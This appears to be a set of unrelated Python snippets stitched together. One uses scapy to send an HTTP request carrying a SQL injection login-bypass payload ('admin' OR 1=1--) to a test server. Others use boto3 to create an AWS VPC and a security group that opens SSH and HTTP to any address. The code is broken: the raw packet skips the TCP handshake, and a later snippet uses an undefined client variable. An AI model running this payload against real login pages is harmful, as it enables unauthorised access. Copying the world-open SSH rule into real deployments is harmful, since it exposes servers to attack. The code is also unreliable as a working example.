from scapy.all import *

# Define the target
target_host = "192.168.1.100"  # Replace with your test server's IP
target_port = 80  # Port for HTTP traffic

# Craft the HTTP request with an SQLi payload
http_request = (
    "GET /login.php?username=admin' OR 1=1--&password=anything HTTP/1.1\r\n"
    f"Host: {target_host}\r\n"
    "User-Agent: ScapyTestClient/1.0\r\n"
    "Accept: */*\r\n"
    "Connection: close\r\n\r\n"
)

# Build the packet with IP and TCP layers
packet = IP(dst=target_host)/TCP(dport=target_port)/Raw(load=http_request)

# Send the packet and wait for a response
response = sr1(packet, timeout=5)

# Display the response if received
if response:
    print("Received Response:")
    response.show()
else:
    print("No response received.")


import boto3

# Using a completely different name for the client
compute_client = boto3.client('ec2')

# Creating a VPC
response = compute_client.create_vpc(CidrBlock='10.0.0.0/16')
print(response)


# Step 1: Create a Security Group
response = ec2_client.create_security_group(
    GroupName='MySecurityGroup',  # Name of the security group
    Description='My custom security group',  # Description
    VpcId='vpc-xxxxxxxx'  # VPC ID where the security group will be created (replace with your VPC ID)
)

# Get the Security Group ID from the response
security_group_id = response['GroupId']
print(f"Security Group created with ID: {security_group_id}")



# Step 2: Add Inbound Rules to Allow SSH (port 22) and HTTP (port 80) Access
ec2_client.authorize_security_group_ingress(
    GroupId=security_group_id,
    IpPermissions=[
        {
            'IpProtocol': 'tcp',
            'FromPort': 22,  # SSH port
            'ToPort': 22,
            'IpRanges': [{'CidrIp': '0.0.0.0/0'}]  # Allow SSH from any IP
        },
        {
            'IpProtocol': 'tcp',
            'FromPort': 80,  # HTTP port
            'ToPort': 80,
            'IpRanges': [{'CidrIp': '0.0.0.0/0'}]  # Allow HTTP from any IP
        }
    ]
)
